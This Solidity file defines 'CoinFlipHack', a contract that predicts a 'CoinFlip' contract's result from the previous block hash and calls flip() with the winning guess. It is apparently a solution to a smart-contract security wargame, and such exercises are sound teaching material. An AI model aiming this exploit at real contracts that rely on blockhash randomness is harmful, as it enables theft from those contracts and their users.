// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

contract CoinFlipHack {
    
    using SafeMath for uint256;
    
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address constant COIN_FLIP_CONTRACT = 0xa294ef6452Ef3c5A790197E845E301f6b632Eb91;
    
    function guess() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        
        CoinFlip cp = CoinFlip(COIN_FLIP_CONTRACT);
        cp.flip(side);
        
        return true;
    }
    
}

abstract contract CoinFlip {
    function flip(bool _guess) public virtual returns (bool);
}